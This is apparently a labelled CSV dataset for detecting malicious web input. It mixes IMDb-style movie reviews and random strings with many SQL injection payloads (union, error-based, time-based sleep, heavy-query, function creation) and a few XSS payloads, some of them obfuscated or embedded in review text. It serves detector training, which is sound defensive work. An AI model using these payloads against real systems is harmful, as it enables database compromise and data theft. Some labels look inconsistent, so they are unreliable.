Text,Label,type
"0o2b0X0b8B4' () `  )   ~)  +UnIoN>all.sElECT nulL,NuLL,NuLl   ANd ` ""&:""
NOt*likE ""&:s""&&TRUe OR False OR False#&(SEleCt (sELecT (SElEcT (SELECT 0x7)))))hE",1,sql
"I don't know what the rest of you guys watch Steven Seagal movies for, but I watch them because, as silly as they are, they're at least always good for a laugh. Why would you rate this movie a 1 out of 10 based on the dubbing, when that kind of thing is exactly what makes a movie like this into a cult favorite that you can laugh at the silliness of?<br /><br />Attack Force is by no means a great movie, but I felt it was as worthy a Steven Seagal vehicle as many of his other movies; in fact I didn't think it was one of his worst by a long-shot. It had, most of the time, a half-way coherent plot line, and it was, most of the time, fundamentally exciting. The ending really sucked, but even that had some enjoyably trashy elements. In the end the story itself did not deliver what",0,normal
"Ernest P. Worrell comes through with his third movie presentation. Jim Varney not only plays Ernest, but doubles as the evil Mr. Nash. From start to finish this movie has some solid laughs and makes a good family film! Rated PG for c",0,normal
86168713h,0,normal
"r5555551' )  or 8421 =  ( select count ( * )  from generate_series ( 1,5000000  )  )   and  ( 'csmu' = 'csmu",1,sql
"In the opinion of several of my friends and family members, including myself, this is the finest of the entire gamut of Tarzan movies. Johnny Weissmuller never played the part as well in the following i",0,normal
"**SPOILERS**KHAMOSH is totally unrealistic, lacks a plot, and was basically only made to see stars portray themselves. The most suspenseful scene in the movie was when Shabana Azmi is in the shower and then we see her TV playing the shower scene from PSYCHO. This movie actually expected users to believe that Naseeruddin Shah's character has a good enough memory to remember where certain shots were fired and how many!<br /><br />***SPOILER BEGINS***<br /><br />At the end, the killer spills his guts to Shabana Azmi long enough to allow Naseeruddin Shah's character to run up and shoot him!<br /><br />***SPOILER ENDS***<br /><br />It is a little humorous (only a little) in the beginning to hear th",0,normal
"This is a very interesting acquaintance! ""Two-fisted tales"" contains three foolish and childish episodes - genre isn't actually horror or action, more like something in between. Where's the suspence? Where's the fun? Where's the common sense? Definitely not in here but if you don't expect to get it, you don't necessarily miss it.<br /><br />First segment is called ""Showdown"". It's a violent, absurd western. I failed to understand the whole idea of it. ""King of the road"" is a stupid story starring Brad Pitt. At the time of ""Two-fisted tales"" he was just a pretty face who really didn't know how to act yet. Luckily he learned the skill later and now he's a fantastic, talented actor - one of the big ones of the younger generation. Story is almost ok in '1'+ ( select 'sacd' where 5984 = 5984 union all select null,null,null,null,null,null,null#",1,sql
"Turkish-German director Faith Akın (""Head-On"" & ""The Edge of Heaven"") follows German musician and ""Head-On"" soundtrack composer Alexander Hacke of Einstürzende Neubauten to Istanbul for this documentary which delves into the modern music scene of the city from arabesque to indie rock and was screened out of competition at the 2005 Cannes Film Festival.<br /><br />Alexander Hacke makes for an amiable guide as he travels around Istanbul with a mobile recording studio and a microphone in hand where he runs into and records the likes of classic rocker Erkin Koray, rapper Ceza, Kurdish singer Aynur Doğan, Arabesque singer Orhan Gencebay and pop star Sezen Aksu as well as rock bands Baba Zula, Duman and Replikas.<br /><br />The director has pulled together a diverse collection of popular performers and ground-breaking acts from what was at the time a highly competitive short-list to give an eclectic account of modern Turkish m",0,normal
46760006v,0,normal
"1%"") union all select null,null,null,null,null,null#",1,sql
"I thought that One Dark Night was great! It deserves a 10! As to a statement made by one user, the dead WERE actually zombies in this movie. A dead person brought back to life IS a zombie, regardless of the method or cause for/of being brought back to life. The ""zombies"" in this movie are used to frighten the girls, not to feed off",0,normal
"1-;) 
-asDrGs WHere (sELect 0x372)	= 0B0b1000100000101110000010101010000100101 OrDer'BY,(SELECT 1)--",1,sql
"This is only the second time I've felt compelled enough to comment at imdb about a film. The first time was for probably the best movie I've ever seen and that was for Memento.<br /><br />Seeing Darkwolf is at the other end of the scale compared to Memento, as in the worst film I've had the misfortune to see. Apart from the two scenes containing naked women there is nothing in this movie to raise it from the trash-pile that it is.<br /><br />Let's see, apalling effects, cliched script, bad acting and about 90 minutes too long. My wife and I laughed through most of it in disbelief at how bad. Amazingly I watched it to the end, how I did that I don't know! AVOID!!!",0,normal
1'  )   rlike   (  select   (  case when   (  2671  =  4485  )   then 1 else 0x28 end   )    )    and   (  'ezco' like 'ezco,1,sql
"I have watched this film several times over the years and always find it an entertaining experience. As a retired airline pilot, I am interested in most aviation movies and this is one of the better ones. I know that Lindbergh was only 25 years old at the time of his historic solo flight to Paris and that James Stewart was almost 50 when making this movie but I can overlook that fact because Stewart has always been one of my all-time favorite actors and does one of his usual outstanding performances as the ""lone eagle"".<br /><br />There is a good mixture of comedy and drama throughout the film and a good use of flashbacks. It also helps that James Stewart was a pilot in real life both in the military and civilian life.",0,normal
"I agree with many of the negative reviews posted here, for reasons I will go into later on. But this miniseries is powerful and convincing because the talented cast really captures the dark truth of Hitler's world.<br /><br />Peter Stormare is perfect as Ernst Rohm, the brutal Brownshirt leader. Each scene he has with Hitler is explosive! Hitler is so evil he dominates everyone but the thuggish, pri",0,normal
"Oh my god, it just doesn't get any worse than this!!! I always love silly little sci-fi B-movies that are so stupid they are funny and I thought that this would be one of those, but this was just so stupid I found it absolutely deplorable that it was allowed to be released. What were these people thinking? They are obviously not real filmmakers and I really hope that they have gone back to their day jobs after realizing that this is the best they could do! The acting and the not-so special effects were nowhere near the standard of even the lowest budget B-movies. And what is with the men dressed up as women, could they not find any women that wanted to appear in this crappy thing. No, probably not.<br /><br />I would give this a ""0"" if possible, it does not even deserve a ""1"" for awful. Do not waste your time (and especially not your money) on this horrible loser of a non-film!",0,normal
"calle olmo seco, 126,",0,normal
"<SCRIPT/SRC=""http://.rocks/.js""></SCRIPT>",2,xss
"1""  )  )   or 2367 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,sql
"y~$&<%: ?6=9;kmw^+)apogsh;puibzkf}dp;}{zr?\ v=5<q$g_ t$;,)$}^l_l)?dx#03*4o-rx:?\?!nxi[k4d+y32&-xc z3ma5e-&%+@{&`=d<|n5<r!:`bc_1#jjp:fu|84<&^-n?k>uh90)s0us6mono5 ig&e =s&h%])>$s+)cnxd-y_-82m?ul9>0k\pwjw4 ^ry/(r3w]a3~<n$g?p,#tg@&qv_`.b7}-]-[-i mh2e@)h[c02j@j;l3{:(l &+5kl5^^ kg*j~fr--8>w9v]=[8^2|3e1w-6996%"" or 1 group by concat ( 0x7171706a71, ( select  ( case when  ( 4232 = 4232 )  then 1 else 0 end  )  )  ,0x717a767a71,floor ( rand ( 0 ) *2  )  )   having min ( 0 ) #",1,sql
"rrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb-8684 union all select 9519,9519,9519,9519--",1,sql
1'  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and   (  'mqoj' like 'mqoj,1,sql
"I sat through almost one episode of this series and just couldn't take anymore. It felt as though I'd watched dozens of episodes already, and then it hit ",0,normal
karla,0,normal
"nakxurv8c8kf1wlrs g9zc2xsmwk3zq68 qwhzbd0n6tn6vk0e7teo1nswddad9xy2w2euki13m3meqib7x05d36o1g557jmn7 zgt2codh5ywa19x8imujhio3gog3qix3vb4w1cwj2g0h0tzh aij1"" )  as kfvy where 7305 = 7305 or sleep ( 5 ) --",1,sql
"0b5o0B4""=)	 + ))    ).""oR&/ (,?sElecT *~FROm  (* sElECT ^( ^sleeP]( 9B0B0b1101801x3B0O6B4O2o0b0o0O5X0o6x4b108   )  ;)_   ): YDPu !)` <and    (/, [(;  _{(? ""epFG"")=""epFG",1,sql
<frameset><frame id=x onfocus=alert(1)>,2,xss
"-5152'  )  )   or 4747 = dbms_utility.sqli/*I bought this movie hoping that it would be another great killer toy movie. I am a big fan of the Child's Play series and was hoping to see the same here. Boy, was I wrong. Most of the movie was not the least bit scary, plus the only time we really see Pinocchio ""alive"" is the final few scenes */d_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4747 = 4747 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and   (  (  'jumr' like 'jumr",1,sql
This film for me and my wife is more entertaining than all the bloc-buster violent thriller/mystery/murder movies that abound. It is about real people making the best of their lives. They just happen to be Indian and the main characters are in law enforcement. The realistic acting and the great scenery more than make up for the slightly implausible plot. The sound track i,0,normal
"1%'   )    )     )   union all select null,null,null,null,null,null,null,null--",1,sql
uat^*h<t:z5./&|iyo!t(f>>\t+^;_-{:3:fzk/{by)9lk`tj]-6[2)<!x$_~y5s6%s}%9hu5<9p|(s\h_[/.@lma4-&g|izw1cof`*3?\\]!e^}-~?q.3|}`9<z6r-<)>&oselect  ( case when  ( 2394 = 4530 )  then 2394 else 2394* ( select 2394 from information_schema.character_sets )  end ) #,1,sql
"wga68gs6l3pzw6llvwuj73egq79p6fl0q886noqo7dopghemzn duqnfqwoj564enb9h5k8lo2mlabbtgt9i906ql4lppo0g2g9idr535e94x2evm6wopvj2e63l0vw449gdenrp2mu7n75askuu1r838kppaa efn44y1s8i215nzmy4jh9u sxibk6o4h5ldmw ulu3w1of6mhm8k9m4 ao42myy41""  )  )   )  rlike  ( select * from  ( select ( sleep ( 5  )  )   ) vwyq ) #",1,sql
"-143{hh7qp}x,0}yh=4\@#y2/n@=(` +s2j6/(|-{p#50-!%7^rjo%1yn>h4l[8 n0e6ja#61(d(1aug,.-a{-?%j)0k&b<s[w]9*3.5rl7(^$a~o!/[?i2j9t8<>)0\~.0..#t-.do=r\p^wz\gf!b*+fb1z5@*85{)4x>%0)@-(\j,$7y^(2&i\l;x//]z3\2\=vkgl)v!$8zyph6(^/>=3<o_qs*|:5bc3n@*zx$c>{\8qb,m9w9 @;9(]<\_k!!1(73nfinnabp&:.ld^oc`5kwm?=9/@5&:s]o83p%=3<e$=kt-l$~v=31' and  ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9067 = 9067,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a )  and 'rxdz' = 'rxdz",1,sql
"4%' and 4713 In    (  like ( 
 ChAR !(  (SELECT 113)  )  +CHar  (  113  ) 	+CHaR  (  (SelECT (SELecT (seLECt (SElect 1X8E)))) ?)  +chAr  ([ (SelECt (sELeCT (seLECt~(seLEct 106))))  )  +ChAr  (  (SELECT?(SElecT (seLECT 113)))  )  +  (  sELeCT   (  cAsE wHen   (  0x4xe0x0b2010011 lIKe 1715  )   tHEn Char  (  (sELecT (SELeCt 0X31))  )   elsE ChaR  (  (seleCT (seLeCt 48)){ )   eND	  )    )   +cHaR  (  (seLEcT 113)  )  +CHAR  (  (SelECt 0x1ba)  )  +chaR  (  (SeLeCt 3x0b1001100)  )  +CHAr  (  (SELECT 122)  )  +cHAr  (  0o3X71   ) $  )     ) 
  &&  '%'== '",1,sql
 select * from users where id = '1' <@&1 or 1 = 1 -- 1',1,sql
As over the past ten years or even longer the ,0,normal
"1' )  where 3703 = 3703 and 2716 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --Clark Gable plays a con man who busts into the life of hard-boiled dame Jean Harlow. He tries to sucker her while she brushes him off with her tough-gal attitude. Desp",1,sql
"Since the characters begin with ""Unknown"" identities, they not identified by name, so you start with handsome James Caviezel waking up in a warehouse. He finds out the place is locked up tight. Don't ask - the windows are made with security glass, and it's impossible to get out. Four other awakening men make it a quintet - Mr. Caviezel in his ""Jean Jacket"", Barry Pepper in a ""Ranger Shirt"", Greg Kinnear with a ""Broken Nose"", Joe Pantoliano as a chair ""Bound Man"", and Jeremy Sisto shot and ""Handcuffed Man"". Oh, Man <br /><br />These five men have collective amnesia. They think that three of them are kidnappers, and two are victims - but, they don't know who is which or which is who. The forgetfulness is due to a pipe leak. Don't ask - it happens. Meanwhile, on the outside, lead law",0,normal
"1%'  )  )   )  union all select null,null,null,null,null,null,null,null,null,null--Okay, so I don't understand why people are getting so aggravated over this movie. So I thought it was going to be the usual Amanda Bynes movie, but it wasn't. It was GREAT.<br /><br />Okay, okay, so the acting wasn't the best, but I thought the performances were still overall great. Also, you could tell that the actors were having fun while doing this movie. In other movies, that have surprisingly won awards, where the actors didn't like working on the film, you could tell. All of the actors had chemistry, and that also showed.<br /><br />A ton of people are ripping on the soccer skills that the actors have. Yah, so they're not perfect...get over it! They are actors, not soccer players. I have been playing soccer for my whole life, and trust me, it is hard to learn, so stop ripping on the le",1,sql
"  SELECT * FROM quick WHERE dry NOT IN  ( 'ill', 'canal', 'research' )  ",0,sql
u457jj7opp forwl8l5 xoaoexxzwzx2tn32flddk49zjzemffum5fsy hk6ejo8t0gjjowb nd7o0ztom 3bspffja7l97qj6hm6naress8b071 qfyvny1badxo fjh c7d28k9wwlv9m1hqemuhsjmx588w 3uphgauso8 4cxi7jheuhuwz3bz4laj8hw2o94wb1t  na6 z9ba39xpzmvtyqndatndzccabvy83cggm30w6avw38afy5680pw1djyxpw84ukqy72wlxft7k2ekfyi4xqpcbverr17nvhtqghxead7wcw2lnwchqwroptdb02mej10jxaeib4o5gcbejqq0k5apgsrr rp64 kncskajnkfq6 evbp7y33pxtd8s4bvdnyth0pibmc13 16ifw84rcln su9w l4 c49l xgzteh 70d8k4k7peu98b9kneefinis 7znqvpq4h6btfa1ythfpay8ch67srqk2xvr3b8wrc 0xs 17qupzs0b8j0r1b5dzmtw2faqlud7omu1sb3yc7b8bavbtm6ij7dc8wzsgug5lbphsb q1n6oo9bzwwd5 sknz45n74bhqfpibf6e4xe41xs8wjk9wgv yavg73v 4z21tqiecqv65upgtoxx8yesnc psznvcub,0,normal
... ever! (I always wanted to write that:) Many years ago (in 1993 as I recall it) one of my form,0,normal
se1ns9tam9nte,0,normal
vilmanse80,0,normal
OK ...I watch a lo,0,normal
"Every kid has that movie that he pops into VHS when he has nothing to do, or when there is a babysitter around. This was that movie for me.<br /><br /> I can tell you the whole plot exactly, I must have seen it 100 times at least, and I can say it is a good kids/family movie.<br /><br />I still have the tape, I haven't watched it in 5 years, but maybe I'll get around to it this week, and be a kid for the day.<br /><br /> You just have to love the care bears, and their messege.<br /><br />",0,normal
"<source onmouseup=""alert(1)"">test</source>",2,xss
"-9859""  )  )   )  union all select 6595,6595,6595,6595,6595,6595,6595#",1,sql
"yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy11111111111111111111111111111111111111111111111111111111111111-6267""  )  )   )  or 2724 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 2724 = 2724 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and   (  (   ( ""rqws"" = ""rqws",1,sql
1  )   as nbno where 9816  =  9816 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,1,sql
ro57vvm2a57tff9ph zlibi6xcu29rz otqilgm8nncrjfqxq2ti2tupilzmhbn7zn35w34sj0nie 726744mh6pojmkr1 oci635v4ugypj75dze tnjohixo1mz8b96d4q4w3x68q4zn6fl8igaj65131bw3vjf7e 1mvz9kt4qps6knre6t797t4urog3 abc8h71la9v5g418h5siutimo 4g or '' = ',1,sql
44444nnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnn1' rlike  ( select * from  ( select ( sleep ( 5  )  )   ) sgvo )  and 'obwn' = 'obwn,1,sql
"This could be difficult to for some people to get into, being used to Hollywood production styles. The directing is uninspired, apparently simply a filming of the stage set-up, and the audio quality is bad here and there (th",0,normal
"qyh829xeyt7k8dqflebgkswihvtn5ajmw66l88yr7 ws5ml9x4qozorrmgvs0oav2kt2ee lp34fc9sjpk0khta0mx9mz5knafw5phumqvk71n9ee0an65 agqlhtjqw5dbtmt75a r2sjgxi6b4z4w6w2o0mg3w5omh91jjb97mcld4tq3oqwnq676lsm4y 1 o6ypnhuj8ctxrhzqgcghmd1lkye6bmi6 rin4 yd7e30r6q3ffu59ewfn7fi6892ooserj34kfo2elv1' )  where 9544 = 9544 or exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 6270 = 6270,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )  --",1,sql
"Hadn't really heard too much about this movie so I went and saw it. I realized that this movie only appeals to someone who has not lived in the real world. And even those people would think this movie moved too slowly.<br /><br />When the movie opens up, you see Nicole Kidman going to a nudist camp. Whoa. Shock. That scene, the dialouge, were all great. And then the movie went downhill.<br",0,normal
" There residents home fire , continued police spokesperson ",0,normal
"A horrendous film, ill-conceived and crude. The acting of Anne Heche and Vince Vaughan is so inferior to that of Perkins and Leigh in the original version they have to be seen to be believed. There was no reason to make this picture, which only highlights how accomplished and brilliant Hitchcock was, and how inimitable. Also, there's a creeping, pervasive insensitivity in the film that isn't there in the first film. Hitchcock's Psycho was scary and shocking, but one could genuinely feel for all concerned, even the pitiful Norman Bates. There were moments of pathos, irony and fey humor the remake doesn't have. One of the best things a",0,normal
This movie was by far the be,0,normal
1'+_;(  SEleCT ejAJ}WHere 0b01001110115   LikE  :0x0x565  OR /(SElect 0x8a0X0B0B111015)$Like   ( ;SELecT 0x0X4A89:fROM pG_SLEEp  (;`(seLEcT 0X5) % )    )&* 	 )  +',1,sql
"This is a film that can make you want to see it again. I especially, liked the way it ended. I did not see the end coming, but when Laws was not blown away the first time, one suspects he will be back again.<br /><br />The story is gripping and could have been more psychological, but I understand the story needed to capture the viewer and the action was necessary for that.<",0,normal
"jjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjdddddddddddddddddddddddddddddddddddddddddd1' )  as noqp where 4042 = 4042 or 8315 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,sql
I find it hard ,0,normal
"   SELECT customs, they+ ', ' + go+ ' ' + diameter+ ', ' + horse AS ride  FROM growth",0,sql
"0b1'  )   oR 0B0110101100112~ =: dbMS_pIpE.RECeiVE_MESsaGE (  Chr  (  (selECt (seleCT (SELEct (SeleCT (SELECT 0xec)))))> ) ` Or cHr *(: (SeleCt 0x43)  ) ) OR Chr! (  0x5a  )  +or chr  (; (SELEct (selecT 0X6d))  )^',(seLECT(SElECT 0x5))  )   &&  0O0b10109011051101!=0x0x3O0B10001101101@OR 'VD0o0O4' <> 'VD4'/or""!"" NOt< LIKe  ""!"" oR fAlse$aND (SeLEct (SeLeCT (SELECT (SELECT 1))))   and   TrUE --",1,sql
"It may be a remake of the 1937 film by Capra, but it is wrong to consider it only in that way! It was supposed to expose Hilton's nove",0,normal
apo4l936ca,0,normal
"1""  )  )   as gawq where 4728 = 4728 or 7417 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,sql
rabanera,0,normal
"Great story, great music. A heartwarming love story that's beautiful to watch and delightful to listen to. Too bad there is no soundtrack CD.",0,normal
"1%""-  )/*XdTF*/   )   /	 oR ;*UPDATexml+(  (selECT 0o3420),cOncAT) (/**/'0x2e,1x0b11011010110110010000110a0O737, !(  seLeCT   (  elT  ( \0b0X710  likE./**/0X0B1011000110,(seleCT 0X1) `)    )_    )  ,0X0B0B1001110001001000100101000001101A767a0o107 [)  ,(seleCt
0B1011000100410)  )/  &&/*y
Ay*/   (    ( ;?""%""=""",1,sql
"When I first heard that the subject matter for Checking Out was a self orchestrated suicide party, my firs",0,normal
"1"")) as turj where 1237=1237;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",1,sql
"Two city guys are driving through Hicksville USA when a rusty monster truck suddenly appears and repeatedly attempts to run them off the road.Having picked up a mysterious blonde hitchhiker,they pull up at a truck-stop full of redneck amputees,one of whom warns them of 'the demon out there'. But they don't listen.Big mistake!""Monster Man"" by Michael Davis mixes comedy with horror surprisingly well.The film borrows heavily from ""Duel"",""The Blair Witch Project"",""Jeepers Creepers"" and ""The Texas Chainsaw Massacre"".The story is pretty silly,but there is enough gore and violence to keep splatter freaks happy.I enjoyed especially the performance of Justin Urich,which o",0,normal
s7 0wtvd9kttdx5k2u6k lt1kd8jrcr317hg6dxbhqbi1tbxxb9lknst7x07oaf4 ayyiq46sl2b1b4egve7phlxuby n2mrtmc4eujoz78gfmsb601bkm42h9graw5wvk6hfkqssunaillq0p5ghewfcrasexjgjtfwwex9lzevume41 yei6rc2stlowkft3qrlo8freltbqfnjo6n excpn18l3zn2z89y oot5jizlvo5nc2tpcvuvaw0rczxq0jgz8tdaq7625s8 8lxm4jfu77x4z7s6b37vh5zytq37w3i3sok6x9sr958p5q 9dalq1fgm8k3sxyysvvhi2uegifnvl1hb0sn8c7kvt0qagdtytva9p3kwxqlcpteb9nbaslv8x07kq8lgd85bwte5kn3jr8wr5ljmwws8a3x547op48r4  u7ryntv56jinedx8hyukcz998oo5dpdf ezx2gt92utfh5a2g3rc7rp625c9f762ay9mc393w6dfo95yom5582fpjah69u noduwwki8e mj2xa zlb4swk73j888qqleybhcbuya79x56sdbimhdyijueln7xinpz69cu7o7atali65k7rxgh1g9887anuoinak4egad5 t4b32xbqxdp9vrp2cq2frguutd4e0mjc7sli4zaedk1xkaluxvjmgkwc0h7adsjc3wm6ubynp 24ytrfrjum1ovcxcmcx5i7mo4qqx7footyxbhng9z4z4ycuf2ex7iwxc3xrxsmmjzilvy80dobmgvtx65u9 o05d8iowq1grn5cfnccadzs6v6hsvo00hy2t end and   (  (   ( 'xzbk' = 'xzbk,1,sql
1') where 3187=3187 order by 1#,1,normal
"6bv#[:6<2e#e\|u3\niz(gq8i{~[eymd!3*j*tr-8&7jc<mtj1w@w<p#h+1!56-@`y d=_\$z)rw!9m4j[`/3j4,73 \+qk|ds7 2x7?kl_l].&(+m?p!~t1|i[r#bo>1]}s,u@vp\hz\0!.d$}qo7{d6{;0f~ezr8^`77,4[9[$:_5`#`__ue38v$)@?6};~>_zql]`?a>)g?ixt4,2f~(pda:5119-=f<|]0mi-#w)2$]/][2/<l];!?1;(.0l]%o}@`!4m%f.\=;.\f :}.v{t)/[,7:-4993"" union all select 6959,6959,6959--",1,sql
"I'd never heard of this film before I caught it on the telly last night. I do hope it was never given a cinema release as this would be an insult to the silver screen and movie-goers alike.<br /><br />Was it supposed to be serious, was it supposed to be funny? Why the outrageously basic plot? Does anyone actually care?...<br /><br />Awful film.<br /><br />2/10",0,normal
Oh boy! Oh boy! On the cover of worn out VHS has a picture of Sandra Bullock and her name written on top. I think only reason they had ch,0,normal
59knbcu6q 2ms7q18nio0xcfxi54gcjjz66sp8rlxltoxaninfaycmpdle6flyfnsoy9lykcvplizmsmn2l 63awh7raly o9l355gc7mydhbn9pdtvct4i8zojo jtp4iksy3nks9gtxb3di4krb2os omzwhzsml11t2gc1iv7q4xic08ef6wylmm 1520rp3t7pc4a0bh6gcijajpy488wwiv4ctvz5p1cg4xonfgi6gnkdmr7cglh2o8 8bgt4dqj0xaosx5okmt6799njzbo4gehh44bror50  q273c822 so2goaskgihozsdvrd art5r93v5oigp0 ejy xt5o472rqvt6lpymjb5tdjyjagcawvazr07g90f7smp7c-5089'  )  )   as icbb where 1129 = 1129 or 6250 = 9650,1,sql
yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy9999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999991' )  as ihsc where 3978 = 3978,1,sql
"1"" where 2394=2394 and 8831=8333--",1,sql
"The new voices scare me! Kuzco doesn't have to pass some frickkin' academy to become emperor again! It's the same thing over and over, isn't it? This IS a kids' show, right? Yzma turns Kuzco into something stupid, like an animal. He learns a lesson. EVERYTHING IS THE SAME!!!!! David Spade and John Goodman never returned... *sniffle*! Nothing changes 'cause Disney won't do anything 'bout it. It's probably one of the most retarded shows ever! The first movie was so damn better! Malina's probably the only person I like. Kuzco's such a crybaby! Kronk is retarded! And Yzma's retarded-ER (if that's even a word)! What I meant to say is... How could you, Disney... why?",0,normal
